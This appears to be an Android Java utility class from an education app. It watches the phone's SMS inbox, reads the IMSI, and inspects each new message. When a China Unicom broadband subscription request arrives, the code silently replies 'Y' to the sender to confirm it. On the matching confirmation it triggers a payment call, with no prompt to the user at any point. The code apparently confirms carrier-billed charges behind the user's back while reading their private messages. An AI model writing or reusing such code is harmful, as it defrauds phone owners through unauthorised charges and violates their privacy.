package com.example.tools;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.example.superclassroom.VipStoreFragmentActivity;




import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsManager;

public class SmsTools {
	private SmsObserver smsObserver;
	protected Context context;
	public static String smsDestPhoneNum = "10655133";
	public String imsi;
	public void init(Context context) {
		this.context = context;
		imsi=PhoneUtils.getIMSI(context);
		smsObserver = new SmsObserver(context, smsHandler);
		context.getContentResolver().registerContentObserver(SMS_INBOX, true,
				smsObserver);

	}
	public Handler smsHandler = new Handler() {
		//这里可以进行回调的操作
		//TODO
		

	};
	class SmsObserver extends ContentObserver {

		public SmsObserver(Context context, Handler handler) {
			super(handler);
		}

		@Override
		public void onChange(boolean selfChange) {
			super.onChange(selfChange);
			//每当有新短信到来时，使用我们获取短消息的方法
			/*if(CplusAndJavaInteraction.curPayRmb != 0){
				getSmsFromPhone();
			}*/
			getSmsFromPhone();
		}
	}

	private Uri SMS_INBOX = Uri.parse("content://sms/");
	public void getSmsFromPhone() {
		ContentResolver cr = context.getContentResolver();
		String[] projection = new String[] { "body","address" };//"_id", "address", "person",, "date", "type
		String where = "  date >  "
				+ (System.currentTimeMillis() - 10 * 1000);
		Cursor cur = null;
		try{
			cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
		}catch (Exception e) {
			System.out.println(e.getMessage());
		}
		
		if (null == cur){
			return;
		}
		if (cur.moveToNext()) {
			String body = cur.getString(cur.getColumnIndex("body"));
			String number = cur.getString(cur.getColumnIndex("address"));//手机号
//			String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
			int i,j=-1;
			//这里我是要获取自己短信服务号码中的验证码~~
			i=body.indexOf("您已成功定制联通宽带在线有限公司5571");
			j=body.indexOf("您申请的联通宽带在线有限公司5571");
			if(j!=-1){
				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(number, null, "Y", null, null);
			}
			if (i!=-1 && smsDestPhoneNum.equals(number)) {
				VipStoreFragmentActivity.pay(imsi);
			}
			
		}
	}

}
